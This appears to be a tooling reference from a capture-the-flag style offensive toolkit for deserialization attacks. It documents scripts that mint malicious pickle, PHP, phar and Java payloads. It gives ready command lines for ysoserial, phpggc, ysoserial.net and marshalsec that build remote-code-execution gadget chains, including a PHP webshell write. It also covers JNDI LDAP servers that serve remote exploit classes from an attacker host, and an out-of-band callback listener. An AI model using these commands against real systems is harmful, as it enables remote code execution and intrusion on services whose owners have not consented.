# Tooling — the repo tools and the external generators

## The repo tools — analysis + generation (real flags)

### `tools/pickle_dis.py` — walk a pickle without running it

```bash
python3 tools/pickle_dis.py capture.pkl          # from a file
python3 tools/pickle_dis.py --b64 'gANjbnQK...'  # base64 inline
python3 tools/pickle_dis.py --hex '800363...'    # hex inline
python3 tools/pickle_dis.py capture.pkl --full   # every opcode annotated
```

Verdict line: `data-only stream` vs `code-execution opcodes present`.
Every `GLOBAL`/`STACK_GLOBAL` resolved to `module.attr`, every `REDUCE`
counted. Analysis only — never `loads`.

### `tools/pickle_gen.py` — mint a pickle payload

```bash
python3 tools/pickle_gen.py --marker X1          # benign PWNED_X1 class
python3 tools/pickle_gen.py --cmd 'id'           # os.system RCE
python3 tools/pickle_gen.py --eval "open('/flag').read()" --protocol 0
python3 tools/pickle_gen.py --cmd 'id' --protocol 4
```

`--marker` first; `--cmd`/`--eval` after the sink is confirmed. `--protocol`
0-5 — pick by channel (0=ASCII, 4=compact).

### `tools/php_ser_parse.py` — decode PHP serialize → JSON

```bash
python3 tools/php_ser_parse.py capture.ser
python3 tools/php_ser_parse.py --str 'O:8:"User":2:{...}'
```

Emits the object graph as JSON + lists every serialized class name — the
POP surface to hunt. Handles `S:` escaped-strings correctly.

### `tools/php_ser_gen.py` — mint a PHP serialize payload

```bash
python3 tools/php_ser_gen.py --spec '{
  "O":"Class","props":{"prop":"value",
    "nested":{"O":"Inner","props":{"x":1}},
    "arr":[1,2],"s":"str","i":7,"b":true,"n":null}
}'
python3 tools/php_ser_gen.py --str 'raw' --str-type S   # escaped string
```

`{"O":cls,"props":{}}` = object; `{"S":"x"}` = `S:` escaped string.
Private/protected props need `\0CLASS\0name`/`\0*\0name` — express them in
the spec as `"\u0000*\u0000name"` JSON escapes and the tool writes the bytes.

### `tools/java_ser.py` — walk a Java serialization stream

```bash
python3 tools/java_ser.py capture.ser
python3 tools/java_ser.py --b64 'rO0ABXN...'
python3 tools/java_ser.py --hex 'aced0005...'
```

Walks `TC_OBJECT`/`TC_CLASSDESC`/`TC_STRING`/`TC_ARRAY` → class inventory
(names, serialVersionUIDs, fields) + flags known-gadget class names.

### `tools/msgpack_read.py` — decode a msgpack frame

```bash
python3 tools/msgpack_read.py blob.mp
python3 tools/msgpack_read.py --hex 'c7...'
```

Decodes the frame + names ext types — `ext_hook` is the sink to inspect.

### `tools/web/archive_gen.py` — mint a phar (and other archives)

```bash
python3 tools/web/archive_gen.py phar --metadata '<serialized>' >x.phar
# emits a valid phar with GIF-magic stub → passes getimagesize AND parses as phar
```

### `tools/web/http_probe.py` — the confirming probe

```bash
python3 tools/web/http_probe.py --challenge "$C" --class web-deserialization \
  --url "$BASE/endpoint" --header "Cookie: u=$BLOB" \
  --evidence-regex 'unserialize|Unpickling|InvalidClass|SerializationException|Incomplete_Class' \
  --evidence-kind class --on-match confirms --on-miss inconclusive
```

Emits the full `post-probe` command with `--response` filled — the
verbatim-excerpt gate is satisfied by construction.

## The external generators — the gadget factories

### ysoserial (Java)

```bash
java -jar ysoserial.jar URLDNS 'http://x.YOU/' >u.ser
java -jar ysoserial.jar CommonsCollections5 'id' >cc5.ser
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CC5 'id'
java -cp ysoserial.jar ysoserial.exploit.GadgetProbe http://L/ <lib>
```

### phpgcc (PHP POP chains)

```bash
phpggc -l
phpggc -i Monolog/RCE1
phpggc Laravel/RCE5 system 'id' -b        # -b base64, -u url-encode, -s fast-destruct
phpggc Guzzle/FW1 '/path/s.php' '<?=`id`?>'
```

### ysoserial.net (.NET)

```bash
ysoserial.exe -l
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd /c id' -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c 'cmd /c id' -o base64
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --validationalg=SHA1 --validationkey=HEX \
  --decryptionalg=AES --decryptionkey=HEX --generator=HEX \
  --path=/x.aspx --apppath=/ -c 'cmd /c id'
```

### JNDI side — marshalsec / JNDIExploit

```bash
javac Exploit.java && python3 -m http.server 8000
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://YOU:8000/#Exploit 1389
java -jar JNDIExploit.jar -i YOU          # LDAP+RMI+Tomcat-bypass routes
```

## The OOB listener

```bash
python3 tools/web/oob_listener.py serve --port 8000 --log hits.jsonl
python3 tools/web/oob_listener.py canary --base http://YOU:8000 --name p1
python3 tools/web/oob_listener.py hits --log hits.jsonl
```

URLDNS, `nslookup`, SoapClient-WSDL, `JdbcRowSetImpl` LDAP — all confirmed
by a listener hit, not by a response.

## The write gate

```bash
python3 tools/hooks.py post-probe $C \
  --hypothesis-id H1 --class web-deserialization --verdict confirms \
  --evidence-kind class --evidence 'PWNED_X1' \
  --response 'the response carrying the marker'

python3 tools/hooks.py pre-flag $C --value 'flag{...}' \
  --source 'the response or OOB line carrying it'
```
